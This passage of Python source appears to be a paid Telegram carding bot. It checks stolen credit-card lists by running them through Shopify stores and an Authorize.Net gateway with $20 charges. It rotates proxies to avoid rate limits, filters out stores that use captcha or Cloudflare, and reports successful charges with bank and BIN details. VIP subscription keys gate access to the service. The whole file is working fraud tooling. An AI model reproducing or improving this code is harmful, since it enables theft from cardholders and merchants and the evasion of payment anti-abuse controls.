            return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
            
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'AuthNet API Timeout', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}
    except Exception as e:
        return {'status': 'Site Error', 'message': f'AuthNet API Error: {str(e)[:40]}', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}

async def remove_proxy_by_url(uid, proxy_url):
    try:
        current_proxies = await get_all_user_proxies(uid)
        if current_proxies:
            for idx, p in enumerate(current_proxies):
                if p.get('proxy_url') == proxy_url:
                    await remove_proxy_by_index(uid, idx)
                    break
    except Exception: pass

async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=6):
    if gateway_name == "AuthNet":
        last_res = {'status': 'Dead', 'message': 'API Error', 'card': card}
        for attempt in range(3): 
            p = random.choice(proxies)['proxy_url'] if proxies else None
            r = await check_authnet_api(card, p, session)
            if r.get('status') == 'Site Error':
                last_res = r
                continue
            return r
        return last_res

    lr = None
    tried_sites = set()
    for attempt in range(max_retries):
        if not proxies: 
            p = None
            p_dict = None
        else:
            p_dict = random.choice(proxies)
            p = p_dict['proxy_url']
        
        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS and s not in tried_sites]
        if not acs: 
            acs = [s for s in sites if s not in tried_sites]
        if not acs:
            acs = sites
            
        s = random.choice(acs) if acs else "touch-of-finland.myshopify.com"
        tried_sites.add(s)
        
        if gateway_name == "Shopify":
            r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
            status = r.get('status')
            msg = str(r.get('message', '')).lower()
            
            if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
                if p_dict and p_dict in proxies:
                    proxies.remove(p_dict)  # يتم حذفه من جلسة الفحص الحالية لتجنب البطء، ولكن لا يتم حذفه نهائياً من قاعدة البيانات لتجنب نفاد البروكسيات فجأة
                lr = r
                continue

            if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
                await asyncio.sleep(random.uniform(1.0, 1.8))
                lr = r
                continue

            if status == 'Site Error' or is_dead_site_error(msg):
                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
                lr = r
                continue
        else:
            return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
        
        if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
            _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
            return r
            
        lr = r
        
    if lr: return lr
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card}

def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {}
    ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
    h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
    
    country_code = str(bi.get('country_code', '')).strip()
    flag = bi.get('flag')
    if not flag or str(flag).strip() in ["", "🏳️", "-"]:
        flag = get_flag_emoji(country_code)
        
    cd = f"{sf(bi.get('country', '-'))} {flag}"
    
    return f"""{h}

<b>{CE_DIAMOND} {sf('Card')}:</b> <code>{card}</code>
<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
<b>{CE_CASH} {sf('Price')}:</b> <code>{ps}</code>

<b>{CE_GEAR} {sf('Bank Info')}:</b>
 ├ <b>{sf('Bank')}:</b> <code>{sf(bi.get('bank', '-'))}</code>
 ├ <b>{sf('Country')}:</b> <code>{cd}</code>
 ├ <b>{sf('Brand')}:</b> <code>{sf(bi.get('brand', '-'))}</code>
 ╰ <b>{sf('Type')}:</b> <code>{sf(bi.get('type', '-'))} - {sf(bi.get('level', '-'))}</code>

<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""

async def _send_global_hit(gateway, price, uid, bot, elapsed, card, session, response_msg="Card Charged"):
    return

async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0][:6], session)
        msg = format_card_result(card, gateway, price, bi, elapsed)
        kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069")]]
        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
    except Exception: pass

async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    uid = update.effective_user.id
    pm = await styled_reply(update, f"<b>{CE_HOURGLASS} {sf('Processing file data...')}</b>", use_gif=True)
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('A process is already active! Please wait for it to finish.')}</b>")
        doc = update.message.document
        if doc.file_size > 3 * 1024 * 1024: 
            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('File too large! (Max 3MB)')}</b>")
        if not await force_join_check(update, context): 
            try: await pm.delete()
            except Exception: pass
            return
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0: 
            return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('You must add proxies before checking! Use /addpxy to add.')}</b>")
        
        f = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await f.download_to_drive(fp)
        
        try:
            async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
        except Exception:
            async with aiofiles.open(fp, "r", encoding="latin-1", errors="ignore") as file: content = await file.read()
        if os.path.exists(fp): os.remove(fp)
        
        cards = extract_cc(content)
        if not cards: return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('No valid cards found in the file.')}</b>")
        
        cl = get_cc_limit(await get_user_plan(uid), uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        
        kb = [
            [InlineKeyboardButton('Shopify (Charge)', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
            [InlineKeyboardButton('AuthNet ($20.00)', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
            [InlineKeyboardButton('PayPal (Soon)', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
            [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
        ]
        await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
    except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")

async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE, _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
    if not update.message: return
    uid = update.effective_user.id
    USER_LAST_REQ[uid] = time.time()
    _USER_NAMES[uid] = update.effective_user.first_name or str(uid)
    raw_text = update.message.text or update.message.caption or ""
    
    if not re.match(r'^[/.][a-zA-Z0-9]', raw_text):
        if update.message.document:
            mime = update.message.document.mime_type or ""
            fname = update.message.document.file_name or ""
            if mime.startswith('text/') or mime == 'application/octet-stream' or fname.lower().endswith('.txt'):
                await auto_file_check_cmd(update, context)
        return

    tokens = raw_text.split()
    cmd = tokens[0][1:].lower().split('@')[0] 
    args = tokens[1:]

    if cmd in ["start", "cmds", "commands"]:
        if _MAINTENANCE_MODE and uid not in ADMIN_ID: 
            return await styled_reply(update, f"<b>{CE_GEAR} {sf('System Maintenance')}</b>\n\n├ {sf('The bot is currently undergoing upgrades.')}\n╰ {sf('Please try again later.')}", use_gif=True)
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(update, uid, plan, limit)

    elif cmd == "info":
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        t = f"""<b>{CE_CROWN} {sf('Profile Information')}</b>

├ <b>{sf('ID')}:</b> <code>{sf(str(uid))}</code>
├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf('Active') if is_paid_plan(plan) else sf('Free')}</code>
├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Bronze')}</code>
╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(limit))} {sf('CCs')}</code>"""
        await styled_reply(update, t, use_gif=True)

    elif cmd == "plan":
        if not await force_join_check(update, context): return
        cp = await get_user_plan(uid)
        t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
        for _, pi in PLANS.items():
            t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
        t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
        kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069"), InlineKeyboardButton("Back", callback_data="back_start", style="danger", icon_custom_emoji_id="5445358884480916784")]]
        await styled_reply(update, t, buttons=kb, use_gif=True)

    elif cmd == "fb":
        if not await force_join_check(update, context): return
        txt = raw_text.split(maxsplit=1)[1] if len(tokens) > 1 else ""
        if not txt and not update.message.reply_to_message and not getattr(update.message, 'media', None): 
            return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a message.')}</b>", use_gif=True)
        if ADMIN_ID:
            try:
                if update.message.reply_to_message:
                    await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.reply_to_message.message_id)
                    if txt: await context.bot.send_message(ADMIN_ID[0], f"💬 <b>Note:</b> {sf(txt)}\n📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
                    else: await context.bot.send_message(ADMIN_ID[0], f"📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
                else:
                    await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.message_id)
                    await context.bot.send_message(ADMIN_ID[0], f"📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
            except Exception: pass
        await styled_reply(update, f"<b>{CE_SMILE} {sf('Your message has been delivered to the Owner.')}</b>", use_gif=True)

    elif cmd == "addpxy":
        if not await force_join_check(update, context): return
        lines = []
        if update.message.reply_to_message:
            if update.message.reply_to_message.document:
                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                fp = f"px_{uid}.txt"
                await f.download_to_drive(fp)
                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file: lines = (await file.read()).split()
                os.remove(fp)
            else:
                raw_rep = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
                lines = raw_rep.split()
        else:
            if len(tokens) > 1: lines = args
            else: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide the proxies correctly.')}</b>", use_gif=True)
        
        if not lines: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found in your message.')}</b>", use_gif=True)
        db_p = await get_all_user_proxies(uid)
        eu = {p['proxy_url'] for p in db_p} if db_p else set()
        if len(eu) >= 100: return await styled_reply(update, f"<b>{CE_BOOM} {sf('Limit 100/100 reached.')}</b>", use_gif=True)
        parsed = []
        for l in lines:
            px = parse_proxy_format(l)
            if px and px['proxy_url'] not in eu: parsed.append(px); eu.add(px['proxy_url'])
        if not parsed: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('All proxies are already added, invalid, or ignored (SOCKS).')}</b>", use_gif=True)
        parsed = parsed[:100-len(eu)]
        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Adding proxies...')}</b>", use_gif=True)
        c = 0
        for p2 in parsed: await add_proxy_db(uid, p2); c += 1
        await styled_edit(tm, f"<b>{CE_SMILE} {sf('Successfully Added')}:</b> <code>{sf(str(c))} {sf('Proxies')}</code>")

    elif cmd == "proxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('You do not have any proxies saved.')}</b>", use_gif=True)
        t = f"<b>{CE_GEAR} {sf('Your Proxies')} ({sf(str(len(proxies)))}/{sf('100')})</b>\n\n"
        for i, p in enumerate(proxies[:30], 1): t += f"<code>{sf(str(i))}.</code> <code>{sf(p['ip'])}:{sf(str(p['port']))}</code>\n"
        if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "checkpxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found to check.')}</b>", use_gif=True)
            
        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Starting real gateway proxy check... Please wait.')}</b>", use_gif=True)
        dead_indices = []

        async def _check_proxy_via_gateway(index, p_dict):
            proxy_url = p_dict['proxy_url']
            try:
                timeout = aiohttp.ClientTimeout(total=6, connect=3)
                async with aiohttp.ClientSession(timeout=timeout) as test_session:
                    async with test_session.get("https://api.ipify.org", proxy=proxy_url) as r:
                        if r.status == 200:
                            return
            except Exception:
                pass
            dead_indices.append(index)

        tasks = [_check_proxy_via_gateway(idx, p) for idx, p in enumerate(proxies)]
        await asyncio.gather(*tasks)
                
        deleted_count = 0
        for idx in sorted(dead_indices, reverse=True):
            await remove_proxy_by_index(uid, idx)
            deleted_count += 1
            
        if deleted_count > 0:
            await styled_edit(tm, f"<b>{CE_SMILE} {sf('Check Done')}</b>\n\n├ {sf('Removed Dead')}: <code>{deleted_count}</code> {sf('Proxies')}\n╰ {sf('Remaining Active')}: <code>{len(proxies) - deleted_count}</code> {sf('Proxies')}")
        else: 
            await styled_edit(tm, f"<b>{CE_SMILE} {sf('All proxies are working perfectly via Gateway!')}</b>")

    elif cmd == "rmpxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies to remove.')}</b>", use_gif=True)
        if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Specify all, proxy number, or proxy text.')}</b>", use_gif=True)
        
        arg = args[0].strip()
        
        if arg.lower() == 'all':
            c = await clear_all_proxies(uid)
            return await styled_reply(update, f"<b>{CE_SMILE} {sf('Cleared')} <code>{sf(str(c))}</code> {sf('Proxies successfully.')}</b>", use_gif=True)
        
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(proxies): 
                await remove_proxy_by_index(uid, idx)
                return await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy removed successfully by index.')}</b>", use_gif=True)
        except ValueError:
            pass
            
        found = False
        for idx, p in enumerate(proxies):
            if arg in p['proxy_url'] or p['ip'] in arg:
                await remove_proxy_by_index(uid, idx)
                found = True
                break
                
        if found:
            await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy matched and removed successfully.')}</b>", use_gif=True)
        else:
            await styled_reply(update, f"<b>{CE_CLOWN} {sf('Proxy not found or invalid format.')}</b>", use_gif=True)

    elif cmd == "gen":
        if uid not in ADMIN_ID: return
        if len(args) < 1: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/gen [plan] [qty]</code>", use_gif=True)
        pk = args[0].lower()
        amt = int(args[1]) if len(args) > 1 else 1
        if pk not in PLANS: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Plan. Use: plan1, plan2, plan3, plan4')}</b>", use_gif=True)
        pi = PLANS[pk]
        kdb = await load_keys()
        gc = []
        for _ in range(amt):
            c = f"VIP-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))}"
            kdb[c] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            gc.append(c)
        await save_keys(kdb)
        t = f"<b>{CE_PARTY} {sf('Successfully Generated')} <code>{sf(str(amt))}</code> {sf('Key(s)!')}</b>\n\n├ <b>{sf('Plan')}:</b> <code>{sf(pi['name'])}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n\n"
        for c in gc: t += f"<code>{sf(c)}</code>\n"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "redeem":
        if not await force_join_check(update, context): return
        raw_c = args[0].strip() if args else ""
        c = unsf(raw_c)
        if not c: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/redeem [Key]</code>", use_gif=True)
        kdb = await load_keys()
        if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Key. Please check and try again.')}</b>", use_gif=True)
        ki = kdb[c]
        if ki["used"]: return await styled_reply(update, f"<b>{CE_BOOM} {sf('This Key has already been redeemed.')}</b>", use_gif=True)
        t, d = ki["tier"], ki["days"]
        await set_user_plan(uid, t, d)
        kdb[c]["used"], kdb[c]["used_by"], rt = True, uid, datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        kdb[c]["redeemed_at"] = rt
        await save_keys(kdb)
        ed = (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d')
        limit = get_cc_limit(t, uid)
        
        user_name = _USER_NAMES.get(uid, f"User {uid}")
        safe_name = escape_html(user_name)
        
        msg = f"""<b>{CE_PARTY} {sf('Subscription Activated Successfully!')}</b>

├ <b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a>
├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>
├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>
├ <b>{CE_GEAR} {sf('Mass Limit')}:</b> <code>{sf(str(limit))} CCs</code>
╰ <b>{CE_CHART} {sf('Expires On')}:</b> <code>{sf(ed)}</code>"""
        await styled_reply(update, msg, use_gif=True, specific_gif=REDEEM_GIF)
        
        try:
            an = f"<b>{CE_PARTY} {sf('New Key Redeemed!')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{sf(str(uid))}</code>)\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(rt)}</code>"
            if ADMIN_ID:
                for admin in ADMIN_ID: await styled_send(context.bot, admin, an, use_gif=True, specific_gif=REDEEM_GIF)
        except Exception: pass

    elif cmd == "validate":
        if uid not in ADMIN_ID: return
        raw_c = args[0].strip() if args else ""
        c = unsf(raw_c)
        kdb = await load_keys()
        if not c: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/validate [Key]</code>", use_gif=True)
        if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Key not found in database.')}</b>", use_gif=True)
        ki = kdb[c]
        u = ki.get("used", False)
        ub = ki.get("used_by")
        st = "Used" if u else "Active"
        m = f"<b>{CE_DIAMOND} {sf('Key Information')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf(st)}</code>\n├ <b>{sf('Plan Tier')}:</b> <code>{sf(ki.get('tier', 'Unknown'))}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(ki.get('days', 0)))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Generated')}:</b> <code>{sf(ki.get('generated_at', 'Unknown'))}</code>"
        if u and ub and str(ub).isdigit(): 
            prof_name = escape_html(_USER_NAMES.get(int(ub), f"User {ub}"))
            m += f"\n\n├ <b>{CE_SMILE} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>{CE_CHART} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
        await styled_reply(update, m, use_gif=True)

    elif cmd == "maint":
        if uid not in ADMIN_ID: return
        a = args[0].strip().lower() if args else ""
        if a: _MAINTENANCE_MODE = (a == 'on')
        else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
        t = "ON" if _MAINTENANCE_MODE else "OFF"
        await styled_reply(update, f"<b>{CE_GEAR} {sf('Maintenance Mode')}:</b> {sf(t)}", use_gif=True)

    elif cmd in ["users", "user"]:
        if uid not in ADMIN_ID: return
        active_info = []
        for u, p in list(ACTIVE_MTXT_PROCESSES.items()):
            if not p.get("stopped"):
                un = escape_html(_USER_NAMES.get(u, f"User {u}"))
                gate = p.get("gate", "Unknown")
                total = p.get("total", "?")
                active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
                
        recent_users_info = []
        sorted_users = sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15] 
        for u, _ in sorted_users:
            un = escape_html(_USER_NAMES.get(u, f"User {u}"))
            recent_users_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
            
        text = f"<b>{CE_GEAR} {sf('Global System Status')}</b>\n\n├ <b>{sf('Total Session Users')}:</b> <code>{sf(str(len(USER_LAST_REQ)))}</code>\n"
        if recent_users_info: 
            text += f"├ <b>{sf('Recent Users')}:</b>\n" + "\n".join(recent_users_info) + "\n\n"
        else: 
            text += f"├ <b>{sf('Recent Users')}:</b> <code>{sf('None')}</code>\n\n"
            
        text += f"├ <b>{sf('Active Checkers')}:</b> <code>{sf(str(len(active_info)))}</code>\n"
        if active_info: text += f"╰ <b>{sf('Currently Checking')}:</b>\n" + "\n".join(active_info)
        else: text += f"╰ <b>{sf('Currently Checking')}:</b> <code>{sf('None')}</code>"
        await styled_reply(update, text, use_gif=True)

    elif cmd == "revoke":
        if uid not in ADMIN_ID: return
        if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
        try: tu = int(unsf(args[0].strip()))
        except Exception: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
        await set_user_plan(tu, "Free", 0)
        proc = ACTIVE_MTXT_PROCESSES.get(tu)
        if proc:
            proc["stopped"] = True
            for t in proc.get("tasks", []):
                if not t.done(): t.cancel()
        admin_msg = f"<b>{CE_BOOM} {sf('Access Revoked')}</b>\n├ <b>{CE_SMILE} {sf('User')}:</b> <code>{sf(str(tu))}</code>\n╰ <b>{sf('Status')}:</b> <code>{sf('Demoted to Free')}</code>"
        await styled_reply(update, admin_msg, use_gif=True)
        try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
        except Exception: pass

    elif cmd == "checkgates":
        if uid not in ADMIN_ID:
            await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n╰ {sf('This command is restricted to administrators only.')}", use_gif=True)
            return
            
        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching and filtering gates...')}</b>", use_gif=True)
        try:
            raw_sites = []
            if update.message.reply_to_message and update.message.reply_to_message.document:
                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                fp = f"temp_gates_{uid}.txt"
                await f.download_to_drive(fp)
                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file:
                    content = await file.read()
                os.remove(fp)
                raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
            else:
                async with aiohttp.ClientSession() as s:
                    async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
                        if r.status == 200:
                            content = await r.text()
                            raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
                        else:
                            return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch file from GitHub.')}</b>")
            
            valid_format_sites = []
            for site in raw_sites:
                site = site.lower().strip()
                if not site or "." not in site: continue
                site = site.split('/')[0].split('?')[0]
                if "myshopify.com" in site:
                    valid_format_sites.append(site)
                elif len(site) > 4:
                    valid_format_sites.append(site)
                    
            raw_sites = list(set(valid_format_sites))
            
            if not raw_sites:
                return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('No valid sites found to test.')}</b>")
                
            admin_proxies = await get_all_user_proxies(uid)
            proxies_list = list(admin_proxies) if admin_proxies else []
            
            await styled_edit(tm, f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(raw_sites)}</code> {sf('gates for Captcha & Errors...')}</b>")
            
            working_sites = []
            dead_count = 0
            captcha_count = 0
            
            async def _validate_gate(site_url, session):
                nonlocal dead_count, captcha_count
                p_url = random.choice(proxies_list)['proxy_url'] if proxies_list else None
                target_url = f"https://{site_url}/cart.json"
                try:
                    async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
                        if resp.status in [403, 429, 430, 502, 503, 504]:
                            captcha_count += 1
                            return
                        if resp.status in [200, 301, 302, 404]:
                            working_sites.append(site_url)
                            return
                except Exception:
                    pass
                dead_count += 1

            connector = aiohttp.TCPConnector(limit=60, ssl=False)
            async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=8)) as test_session:
                tasks = [_validate_gate(site, test_session) for site in raw_sites]
                await asyncio.gather(*tasks)
            
            if working_sites:
                async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f:
                    await f.write('\n'.join(working_sites))
            
            global _CACHED_SHOPIFY_SITES
            _CACHED_SHOPIFY_SITES = working_sites
            
            res_msg = f"""<b>{CE_CROWN} {sf('Gates Purge Completed')} {CE_PARTY}</b>
            
├ <b>{sf('Total Loaded')}:</b> <code>{sf(str(len(raw_sites)))}</code>
├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{sf(str(len(working_sites)))}</code>
├ <b>{CE_SHIELD} {sf('Captcha/CF Blocked')}:</b> <code>{sf(str(captcha_count))}</code>
╰ <b>{CE_CLOWN} {sf('Purged Dead')}:</b> <code>{sf(str(dead_count))}</code>

<i>{sf('Sites saved and applied permanently!')}</i>"""
            await styled_edit(tm, res_msg)
            
        except Exception as e:
            await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Error Processing')}:</b> {sf(str(e))}")

# ====================== CALLBACK FUNCTIONS ======================
async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    cp = await get_user_plan(uid)
    t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
    for _, pi in PLANS.items():
        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
    t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
    kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069"), InlineKeyboardButton("Back", callback_data="back_start", style="danger", icon_custom_emoji_id="5445358884480916784")]]
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
